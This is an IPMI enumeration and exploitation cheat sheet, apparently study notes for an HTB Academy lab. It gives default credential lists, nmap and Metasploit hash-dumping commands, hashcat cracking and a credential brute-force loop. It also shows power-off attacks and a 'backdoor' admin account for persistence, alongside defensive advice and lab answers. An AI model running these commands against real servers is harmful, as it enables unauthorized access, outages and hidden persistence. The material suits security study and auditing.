# IPMI (Intelligent Platform Management Interface) Enumeration

## Overview
IPMI (Intelligent Platform Management Interface) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. IPMI can be used to manage a server or network device before the OS is installed, during OS runtime, or even when the system is powered off.

**Key Characteristics:**
- **Port 623**: IPMI over UDP
- **Purpose**: Remote system management, monitoring, and control
- **Independence**: Functions independently of the main OS
- **Access**: Direct hardware-level access to systems
- **Authentication**: Username/password based with various privilege levels

## IPMI Components

### BMC (Baseboard Management Controller)
- **Function**: Microprocessor that monitors the server
- **Independence**: Operates independently of the main CPU and OS
- **Power**: Continuously powered (even when server is off)
- **Access**: Provides hardware access to system components
- **Communication**: Interfaces with various system sensors and components

### Management Console
- **Purpose**: Interface for administrators to interact with IPMI
- **Access Methods**: Web interface, command-line tools, SNMP
- **Functionality**: System monitoring, power management, configuration
- **Remote Access**: Allows remote management of systems

### IPMI Protocol Stack
| Layer | Description |
|-------|-------------|
| **Application Layer** | Commands and responses |
| **Session Layer** | Authentication and session management |
| **Message Layer** | Message formatting and routing |
| **Transport Layer** | UDP/TCP communication |

## IPMI Versions and Authentication

### IPMI Version Comparison
| Version | Authentication | Encryption | Security Features |
|---------|---------------|------------|------------------|
| **IPMI 1.5** | MD5 hash | None | Basic authentication, no encryption |
| **IPMI 2.0** | HMAC-based | AES encryption | Enhanced authentication, encrypted sessions |

### Authentication Types
- **None**: No authentication required
- **MD2**: MD2 hash-based authentication
- **MD5**: MD5 hash-based authentication  
- **Straight Password**: Plain text password
- **OEM**: Vendor-specific authentication

## IPMI Privilege Levels

| Level | Description | Capabilities |
|-------|-------------|--------------|
| **Callback** | Lowest privilege | Basic system information |
| **User** | Standard user | System monitoring, some control |
| **Operator** | Operator level | Power management, system control |
| **Administrator** | Highest privilege | Full system control, configuration |
| **OEM** | Vendor-specific | Custom vendor functions |

## Default Configuration Issues

### Common Misconfigurations
1. **Default Credentials**: Many systems ship with default usernames/passwords
2. **Weak Passwords**: Simple or commonly known passwords
3. **Network Exposure**: IPMI accessible from external networks
4. **No Authentication**: Anonymous access enabled
5. **Version Vulnerabilities**: Using vulnerable IPMI versions

### Common Default Credentials
```bash
# Common default IPMI credentials
admin:admin
root:root
admin:password
ADMIN:ADMIN
root:calvin
user:user
```

## Dangerous Settings

| Setting | Description | Risk Level |
|---------|-------------|------------|
| **Anonymous Access** | No authentication required | Critical |
| **Default Passwords** | Factory default credentials | High |
| **Network Accessible** | IPMI accessible from WAN | High |
| **IPMI 1.5** | Vulnerable version with weak authentication | Medium |
| **Null Username** | Empty username accepted | High |

## Enumeration Techniques

### 1. Service Detection
```bash
# Nmap IPMI detection
nmap -sU -p623 target

# Comprehensive IPMI enumeration
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero target

# Multiple target scan
nmap -sU -p623 --script ipmi-version target_network/24
```

### 2. IPMI Version Detection
```bash
# Basic version detection
nmap -sU -p623 --script ipmi-version target

# Example output analysis:
# 623/udp open  asf-rmcp
# | ipmi-version: 
# |   Version: 
# |     IPMI-2.0
# |   UserAuth: 
# |     CALLBACK, USER, OPERATOR, ADMINISTRATOR, OEM
# |   PassAuth: 
# |     CALLBACK, USER, OPERATOR, ADMINISTRATOR, OEM
# |_  Level: 2.0
```

### 3. Authentication Testing
```bash
# Test for cipher zero vulnerability (IPMI 2.0)
nmap -sU -p623 --script ipmi-cipher-zero target

# Example vulnerable output:
# | ipmi-cipher-zero: 
# |   VULNERABLE:
# |   IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval
# |     State: VULNERABLE
# |     Risk factor: High
# |     Authentication bypassed via authentication type 'cipher zero'
```

### 4. Default Credential Testing
```bash
# Manual testing with ipmitool
ipmitool -I lanplus -H target -U admin -P admin user list

# Test common credentials
ipmitool -I lanplus -H target -U root -P root chassis status
ipmitool -I lanplus -H target -U admin -P password sdr list
```

## Advanced Enumeration

### Using ipmitool
```bash
# Basic IPMI connection test
ipmitool -I lanplus -H target -U username -P password chassis status

# List users
ipmitool -I lanplus -H target -U username -P password user list

# Get system information
ipmitool -I lanplus -H target -U username -P password fru list
ipmitool -I lanplus -H target -U username -P password sdr list

# Power management
ipmitool -I lanplus -H target -U username -P password power status
```

### Using Metasploit
```bash
# IPMI version scan
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS target
run

# IPMI dumphashes (for cipher zero vulnerability)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
run

# IPMI cipher zero
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS target
run
```

### Hash Extraction and Cracking
```bash
# Extract hashes using ipmi_dumphashes
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
run

# Crack hashes with hashcat
hashcat -m 7300 ipmi_hashes.txt wordlist.txt

# Example hash format:
# admin:8140000089eb9c5f41b4e0632b85f1e1e6e9a7b0:f2b4f8c7b4c4b4c4:2:admin:admin
```

## Vulnerability Assessment

### IPMI 2.0 RAKP Authentication Bypass
```bash
# Test for RAKP vulnerability
nmap -sU -p623 --script ipmi-cipher-zero target

# If vulnerable, extract password hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
run

# Hash cracking
hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Common IPMI Vulnerabilities
1. **CVE-2013-4786**: IPMI 2.0 RAKP authentication bypass
2. **Default Credentials**: Factory default passwords
3. **Weak Authentication**: Insufficient authentication mechanisms
4. **Network Exposure**: IPMI accessible from untrusted networks

## Practical Examples

### HTB Academy Style Enumeration
```bash
# Step 1: Service detection
nmap -sU -p623 --script ipmi-version target

# Step 2: Check for cipher zero vulnerability
nmap -sU -p623 --script ipmi-cipher-zero target

# Step 3: Extract hashes if vulnerable
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
run

# Step 4: Crack extracted hashes
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# Step 5: Access system with cracked credentials
ipmitool -I lanplus -H target -U admin -P cracked_password chassis status
```

### HTB Academy Lab Questions Examples
```bash
# Question 1: "What is the IPMI version running on the remote host?"
nmap -sU -p623 --script ipmi-version target
# Look for: IPMI-2.0
# Answer: 2.0

# Question 2: "What is the default username configured?"
# After gaining access:
ipmitool -I lanplus -H target -U admin -P admin user list
# Look for: admin (User ID: 2)
# Answer: admin

# Question 3: "Extract and crack the administrator password hash"
# Use Metasploit to extract hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
run
# Crack with hashcat
hashcat -m 7300 hash.txt wordlist.txt
# Answer: cracked_password
```

### Real-World Scenario
```bash
# Complete IPMI enumeration workflow
# 1. Discovery
nmap -sU -p623 --script ipmi-version target_network/24

# 2. Vulnerability assessment
nmap -sU -p623 --script ipmi-cipher-zero target

# 3. Hash extraction
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
run

# 4. Hash cracking
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# 5. Access verification
ipmitool -I lanplus -H target -U admin -P cracked_password chassis status

# 6. System reconnaissance
ipmitool -I lanplus -H target -U admin -P cracked_password fru list
ipmitool -I lanplus -H target -U admin -P cracked_password sdr list
ipmitool -I lanplus -H target -U admin -P cracked_password user list
```

## Information Gathering

### System Information
```bash
# Hardware information
ipmitool -I lanplus -H target -U user -P pass fru list

# Sensor data
ipmitool -I lanplus -H target -U user -P pass sdr list

# System event log
ipmitool -I lanplus -H target -U user -P pass sel list

# Network configuration
ipmitool -I lanplus -H target -U user -P pass lan print
```

### User Management
```bash
# List users
ipmitool -I lanplus -H target -U admin -P pass user list

# Set user password
ipmitool -I lanplus -H target -U admin -P pass user set password 2 newpassword

# Set user privileges
ipmitool -I lanplus -H target -U admin -P pass user priv 2 4
```

## Attack Vectors

### 1. Password Hash Extraction
```bash
# Extract password hashes via RAKP vulnerability
use auxiliary/scanner/ipmi/ipmi_dumphashes

# Crack hashes offline
hashcat -m 7300 hashes.txt wordlist.txt
```

### 2. Default Credential Access
```bash
# Test default credentials
for user in admin root ADMIN; do
    for pass in admin password root calvin; do
        ipmitool -I lanplus -H target -U $user -P $pass chassis status
    done
done
```

### 3. Power Management Attacks
```bash
# Power off system
ipmitool -I lanplus -H target -U admin -P pass power off

# Power cycle system
ipmitool -I lanplus -H target -U admin -P pass power cycle

# Reset system
ipmitool -I lanplus -H target -U admin -P pass power reset
```

## Enumeration Checklist

### Initial Discovery
- [ ] Port scan for 623/UDP
- [ ] IPMI version detection
- [ ] Service availability confirmation
- [ ] Network accessibility assessment

### Vulnerability Assessment
- [ ] Cipher zero vulnerability testing
- [ ] Authentication bypass attempts
- [ ] Default credential testing
- [ ] Version-specific vulnerability checks

### Information Gathering
- [ ] User account enumeration
- [ ] System information extraction
- [ ] Hardware configuration analysis
- [ ] Network configuration review

### Security Testing
- [ ] Password hash extraction
- [ ] Privilege escalation testing
- [ ] Power management access
- [ ] Configuration modification attempts

## Tools and Techniques

### Essential IPMI Tools
```bash
# Command-line tools
ipmitool             # Primary IPMI management tool
ipmiutil             # Alternative IPMI utility
freeipmi-tools       # Free IPMI implementation

# Scanning tools
nmap                 # Network discovery and scripts
metasploit           # Vulnerability exploitation

# Password cracking
hashcat              # GPU-accelerated password cracking
john                 # John the Ripper
```

### Tool Installation
```bash
# Install ipmitool
sudo apt install ipmitool

# Install ipmiutil
sudo apt install ipmiutil

# Install freeipmi-tools
sudo apt install freeipmi-tools
```

### Custom Scripts
```bash
# IPMI scanner
#!/bin/bash
target_network=$1

nmap -sU -p623 --script ipmi-version $target_network | grep -E "Nmap scan report|ipmi-version" | grep -A1 "open"

# IPMI credential tester
#!/bin/bash
target=$1
userlist="admin root ADMIN user"
passlist="admin password root calvin blank"

for user in $userlist; do
    for pass in $passlist; do
        result=$(ipmitool -I lanplus -H $target -U $user -P $pass chassis status 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "Success: $user:$pass"
        fi
    done
done
```

## Defensive Measures

### Secure IPMI Configuration
```bash
# Change default passwords
ipmitool -I lanplus -H target -U admin -P admin user set password 2 strong_password

# Configure network access restrictions
# In BMC configuration:
# - Restrict IPMI to management network
# - Disable unnecessary services
# - Enable logging

# Disable anonymous access
ipmitool -I lanplus -H target -U admin -P pass user disable 1
```

### Best Practices
1. **Change Default Passwords**: Use strong, unique passwords
2. **Network Segmentation**: Isolate IPMI on management network
3. **Regular Updates**: Keep BMC firmware updated
4. **Access Control**: Limit IPMI access to authorized users
5. **Monitoring**: Log and monitor IPMI access attempts

### Detection and Monitoring
```bash
# Monitor IPMI access attempts
# Check BMC logs for authentication failures
# Monitor network traffic to port 623
# Set up alerts for unusual IPMI activity
```

## Common Vulnerabilities

### IPMI 2.0 RAKP Authentication Bypass
- **CVE**: CVE-2013-4786
- **Impact**: Password hash extraction
- **Mitigation**: Disable cipher zero, use strong passwords

### Default Credentials
- **Issue**: Factory default passwords
- **Impact**: Unauthorized system access
- **Mitigation**: Change all default passwords

### Network Exposure
- **Issue**: IPMI accessible from untrusted networks
- **Impact**: Remote unauthorized access
- **Mitigation**: Network segmentation, firewall rules

## Hash Cracking Techniques

### Hashcat IPMI Mode
```bash
# IPMI hash format (mode 7300)
hashcat -m 7300 -a 0 hash.txt wordlist.txt

# Example hash:
# admin:8140000089eb9c5f41b4e0632b85f1e1e6e9a7b0:f2b4f8c7b4c4b4c4:2:admin:admin

# Optimized cracking
hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### John the Ripper
```bash
# Convert hash format if needed
john --format=ipmi hash.txt

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Post-Exploitation

### System Control
```bash
# Power management
ipmitool -I lanplus -H target -U admin -P pass power on
ipmitool -I lanplus -H target -U admin -P pass power off
ipmitool -I lanplus -H target -U admin -P pass power reset

# Console access
ipmitool -I lanplus -H target -U admin -P pass sol activate

# Boot device selection
ipmitool -I lanplus -H target -U admin -P pass chassis bootdev pxe
```

### Persistence
```bash
# Create new user account
ipmitool -I lanplus -H target -U admin -P pass user set name 3 backdoor
ipmitool -I lanplus -H target -U admin -P pass user set password 3 backdoor_pass
ipmitool -I lanplus -H target -U admin -P pass user priv 3 4
ipmitool -I lanplus -H target -U admin -P pass user enable 3
```

## Remediation

### Immediate Actions
1. **Change all default passwords**
2. **Disable unnecessary user accounts**
3. **Update BMC firmware**
4. **Configure network restrictions**
5. **Enable logging and monitoring**

### Long-term Security
1. **Regular password rotation**
2. **Network segmentation**
3. **Vulnerability scanning**
4. **Access control reviews**
5. **Incident response procedures**
